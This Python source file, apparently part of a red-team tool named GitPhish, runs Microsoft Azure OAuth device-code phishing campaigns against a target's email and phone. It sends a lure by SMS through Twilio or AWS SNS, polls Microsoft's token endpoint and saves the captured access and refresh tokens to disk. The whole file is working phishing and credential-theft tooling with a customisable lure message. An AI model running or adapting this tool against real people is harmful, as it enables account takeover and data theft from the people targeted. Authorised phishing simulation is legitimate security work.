"""
Azure Campaigns CLI for GitPhish - Microsoft OAuth Device Code Phishing with SMS delivery.
"""

import argparse
import sys
import time
import json
import urllib.parse
import urllib3
import os.path
import logging
import requests
import datetime
import concurrent.futures
from twilio.rest import Client
from cryptography.fernet import Fernet
import base64
import boto3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Azure OAuth Configuration
AZURE_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Graph PowerShell client ID
AZURE_DEVICE_CODE_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode"
AZURE_TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"

def setup_azure_campaigns_subparser(parent_parser):
    """Setup Azure campaigns subparser."""
    azure_parser = parent_parser.add_parser('azure', help='Azure Campaign Management')
    azure_subparsers = azure_parser.add_subparsers(dest='azure_command', help='Azure campaign commands')
    
    # Twilio Azure campaign
    twilio_azure = azure_subparsers.add_parser('twilio-azure', help='Azure OAuth via Twilio SMS')
    twilio_azure.add_argument('-e', '--email', required=True, help='Target email address')
    twilio_azure.add_argument('-p', '--phone', required=True, help='Target phone number')
    twilio_azure.add_argument('--sid', required=True, help='Twilio Account SID')
    twilio_azure.add_argument('--token', required=True, help='Twilio Auth Token')
    twilio_azure.add_argument('--from-phone', required=True, help='Twilio phone number')
    twilio_azure.add_argument('--scope', default='https://graph.microsoft.com/.default', help='OAuth scopes')
    twilio_azure.add_argument('--message', help='Custom SMS message template')
    twilio_azure.add_argument('--debug', action='store_true', help='Enable debug logging')
    twilio_azure.set_defaults(func=run_twilio_azure_campaign)
    
    # AWS SNS Azure campaign
    aws_azure = azure_subparsers.add_parser('aws-azure', help='Azure OAuth via AWS SNS')
    aws_azure.add_argument('-e', '--email', required=True, help='Target email address')
    aws_azure.add_argument('-p', '--phone', required=True, help='Target phone number')
    aws_azure.add_argument('--region', default='us-east-2', help='AWS region')
    aws_azure.add_argument('--scope', default='https://graph.microsoft.com/.default', help='OAuth scopes')
    aws_azure.add_argument('--message', help='Custom SMS message template')
    aws_azure.add_argument('--debug', action='store_true', help='Enable debug logging')
    aws_azure.set_defaults(func=run_aws_azure_campaign)
    
    # Set default for main azure parser
    azure_parser.set_defaults(func=handle_azure_campaigns_command)
    
    return azure_parser

def validate_encryption_key(encryption_key):
    """Validate encryption key for secure token storage."""
    try:
        decoded_key = base64.urlsafe_b64decode(encryption_key)
        if len(decoded_key) != 32:
            raise ValueError("Encryption key must be 32 bytes after base64 decoding.")
        return Fernet(encryption_key)
    except Exception as e:
        logging.error(f"Invalid encryption key: {e}")
        sys.exit(1)

class AzureTarget:
    """Target for Azure SMS campaign."""
    def __init__(self, email, phone, encryption_key=None):
        self.email = email
        self.phone = phone
        self.device_code = None
        self.token_response = None
        self.encryption_cipher = validate_encryption_key(encryption_key) if encryption_key else None
        self.headers = {
            "Accept": "application/json",
            "User-Agent": "GitPhish Azure Campaign v0.2.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }

def send_twilio_sms(target, message, sid, token, from_phone):
    """Send SMS via Twilio."""
    try:
        client = Client(sid, token)
        client.messages.create(
            to=target.phone, 
            from_=from_phone, 
            body=message
        )
        logging.info(f"[{target.email}] SMS sent successfully via Twilio")
        return True
    except Exception as e:
        logging.error(f"[{target.email}] Failed to send SMS via Twilio: {e}")
        return False

def send_aws_sms(target, message, region='us-east-2'):
    """Send SMS via AWS SNS."""
    try:
        sns_client = boto3.client('sns', region_name=region)
        response = sns_client.publish(
            PhoneNumber=target.phone,
            Message=message,
            MessageAttributes={
                'AWS.SNS.SMS.SenderID': {
                    'DataType': 'String',
                    'StringValue': 'GitPhish'
                },
                'AWS.SNS.SMS.SMSType': {
                    'DataType': 'String',
                    'StringValue': 'Transactional'
                }
            }
        )
        logging.info(f"[{target.email}] SMS sent successfully via AWS SNS: {response['MessageId']}")
        return True
    except Exception as e:
        logging.error(f"[{target.email}] Failed to send SMS via AWS SNS: {e}")
        return False

def initiate_azure_device_code_flow(target, scope='https://graph.microsoft.com/.default', message_template=None):
    """Initiate Azure device code OAuth flow."""
    data = {
        "client_id": AZURE_CLIENT_ID,
        "scope": scope
    }
    
    try:
        resp = requests.post(AZURE_DEVICE_CODE_URL, headers=target.headers, data=data, verify=False)
        if resp.status_code != 200:
            logging.error(f'[{target.email}] Azure device code request failed: {resp.json()}')
            return None
        
        target.device_code = resp.json()
        
        # Generate SMS message
        if message_template:
            message = message_template.format(
                email=target.email,
                verification_uri=target.device_code['verification_uri'],
                user_code=target.device_code['user_code'],
                device_code=target.device_code['device_code']
            )
        else:
            message = (
                f"GitPhish Security Test - Microsoft Azure Device Verification\n\n"
                f"Your Azure device enrollment for {target.email} requires verification.\n\n"
                f"Please visit: {target.device_code['verification_uri']}\n"
                f"Enter code: {target.device_code['user_code']}\n\n"
                f"This code expires in 15 minutes.\n\n"
                f"[This is a security test - GitPhish v0.2.0]"
            )
        
        return message
    except Exception as e:
        logging.error(f"[{target.email}] Device code flow failed: {e}")
        return None

def poll_for_azure_token(target):
    """Poll Azure for OAuth token after user authorization."""
    if not target.device_code:
        return False
    
    url = AZURE_TOKEN_URL
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": AZURE_CLIENT_ID,
        "device_code": target.device_code["device_code"]
    }
    
    stop_time = datetime.datetime.now() + datetime.timedelta(seconds=target.device_code["expires_in"])
    
    while datetime.datetime.now() < stop_time:
        logging.info(f'[{target.email}] Polling for user authorization...')
        
        try:
            resp = requests.post(url, headers=target.headers, data=data, verify=False)
            response_data = resp.json()
            
            if "access_token" in response_data:
                # Token received!
                if target.encryption_cipher:
                    encrypted_token = target.encryption_cipher.encrypt(response_data["access_token"].encode()).decode()
                    target.token_response = {
                        "access_token": encrypted_token,
                        "refresh_token": response_data.get("refresh_token", ""),
                        "token_type": response_data.get("token_type", "Bearer"),
                        "scope": response_data.get("scope", ""),
                        "expires_in": response_data.get("expires_in", 3600),
                        "encrypted": True
                    }
                else:
                    target.token_response = {
                        "access_token": response_data["access_token"],
                        "refresh_token": response_data.get("refresh_token", ""),
                        "token_type": response_data.get("token_type", "Bearer"),
                        "scope": response_data.get("scope", ""),
                        "expires_in": response_data.get("expires_in", 3600),
                        "encrypted": False
                    }
                
                # Save token
                filename = f'{target.email}.azure_token.json'
                with open(filename, 'w') as f:
                    json.dump(target.token_response, f, indent=2)
                
                logging.info(f'[{target.email}] ✅ TOKEN CAPTURED! Saved to {filename}')
                return True
                
            elif response_data.get("error") == "authorization_pending":
                # Still waiting for user authorization
                pass
            elif response_data.get("error") == "slow_down":
                # Slow down polling
                time.sleep(5)
                continue
            else:
                logging.error(f'[{target.email}] Authorization error: {response_data}')
                return False
            
            # Wait before next poll
            time.sleep(target.device_code.get("interval", 5))
            
        except Exception as e:
            logging.error(f'[{target.email}] Polling error: {e}')
            time.sleep(5)
    
    logging.warning(f'[{target.email}] ⏰ Device code expired without authorization')
    return False

def run_twilio_azure_campaign(args):
    """Run Twilio + Azure OAuth campaign."""
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s'
    )
    
    logging.info("🚀 Starting Twilio + Azure OAuth SMS Campaign")
    
    target = AzureTarget(args.email, args.phone)
    
    # Initiate device code flow
    message = initiate_azure_device_code_flow(target, args.scope, args.message)
    if not message:
        logging.error("Failed to initiate device code flow")
        return 1
    
    # Send SMS
    if not send_twilio_sms(target, message, args.sid, args.token, args.from_phone):
        logging.error("Failed to send SMS")
        return 1
    
    # Poll for token
    success = poll_for_azure_token(target)
    
    if success:
        logging.info("🎯 Campaign completed successfully - Token captured!")
        return 0
    else:
        logging.warning("📵 Campaign completed - No token captured")
        return 1

def run_aws_azure_campaign(args):
    """Run AWS SNS + Azure OAuth campaign."""
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s'
    )
    
    logging.info("🚀 Starting AWS SNS + Azure OAuth SMS Campaign")
    
    target = AzureTarget(args.email, args.phone)
    
    # Initiate device code flow
    message = initiate_azure_device_code_flow(target, args.scope, args.message)
    if not message:
        logging.error("Failed to initiate device code flow")
        return 1
    
    # Send SMS
    if not send_aws_sms(target, message, args.region):
        logging.error("Failed to send SMS")
        return 1
    
    # Poll for token
    success = poll_for_azure_token(target)
    
    if success:
        logging.info("🎯 Campaign completed successfully - Token captured!")
        return 0
    else:
        logging.warning("📵 Campaign completed - No token captured")
        return 1

def handle_azure_campaigns_command(args):
    """Handle Azure campaigns command."""
    if hasattr(args, 'azure_command') and args.azure_command:
        if args.azure_command == 'twilio-azure':
            return run_twilio_azure_campaign(args)
        elif args.azure_command == 'aws-azure':
            return run_aws_azure_campaign(args)
        else:
            print("❌ Unknown Azure campaign command")
            return 1
    else:
        # No subcommand provided, show help
        if hasattr(args, '_parser'):
            args._parser.print_help()
        else:
            print("☁️ GitPhish Azure Campaigns v0.2.0")
            print("Available commands:")
            print("  twilio-azure  - Azure OAuth via Twilio SMS")
            print("  aws-azure     - Azure OAuth via AWS SNS")
        return 0